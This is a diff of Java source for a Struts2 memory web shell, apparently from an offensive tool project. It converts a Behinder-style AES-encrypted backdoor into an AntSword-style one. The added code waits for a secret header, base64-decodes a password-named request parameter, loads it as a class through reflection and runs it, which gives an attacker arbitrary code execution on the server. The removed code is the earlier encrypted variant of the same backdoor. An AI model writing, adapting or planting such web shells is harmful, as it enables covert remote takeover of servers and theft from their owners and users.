@@ -1,21 +1,17 @@
-package com.reajason.javaweb.memshell.shelltool.behinder;
+package com.reajason.javaweb.memshell.shelltool.antsword;
 
-import javax.crypto.Cipher;
-import javax.crypto.spec.SecretKeySpec;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
-import javax.servlet.http.HttpSession;
-import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.net.URL;
 import java.net.URLClassLoader;
-import java.util.HashMap;
-import java.util.Map;
 
 /**
  * @author ReaJason
+ * @since 2025/02/18
  */
-public class BehinderStruct2Action {
+public class AntSwordStruts2Action {
+
     public static String pass;
     public static String headerName;
     public static String headerValue;
@@ -28,45 +24,13 @@ public class BehinderStruct2Action {
             HttpServletRequest request = (HttpServletRequest) getMethod.invoke(context, "com.opensymphony.xwork2.dispatcher.HttpServletRequest");
             HttpServletResponse response = (HttpServletResponse) getMethod.invoke(context, "com.opensymphony.xwork2.dispatcher.HttpServletResponse");
             if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
-                HttpSession session = request.getSession();
-                Map<String, Object> obj = new HashMap<String, Object>(3);
-                obj.put("request", request);
-                obj.put("response", unwrap(response));
-                obj.put("session", session);
-                session.setAttribute("u", this.pass);
-                Cipher c = Cipher.getInstance("AES");
-                c.init(2, new SecretKeySpec(this.pass.getBytes(), "AES"));
-                byte[] bytes = c.doFinal(base64Decode(request.getReader().readLine()));
+                byte[] bytes = base64Decode(request.getParameter(pass));
                 Object instance = reflectionDefineClass(bytes).newInstance();
-                instance.equals(obj);
+                instance.equals(new Object[]{request, response});
             }
         } catch (Throwable e) {
             e.printStackTrace();
         }
-    }
-
-    @SuppressWarnings("all")
-    public Object unwrap(Object obj) {
-        try {
-            return getFieldValue(obj, "response");
-        } catch (Throwable e) {
-            return obj;
-        }
-    }
-
-    @SuppressWarnings("all")
-    public static Object getFieldValue(Object obj, String name) throws Exception {
-        Class<?> clazz = obj.getClass();
-        while (clazz != Object.class) {
-            try {
-                Field field = clazz.getDeclaredField(name);
-                field.setAccessible(true);
-                return field.get(obj);
-            } catch (NoSuchFieldException var5) {
-                clazz = clazz.getSuperclass();
-            }
-        }
-        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
     }
 
     @SuppressWarnings("all")
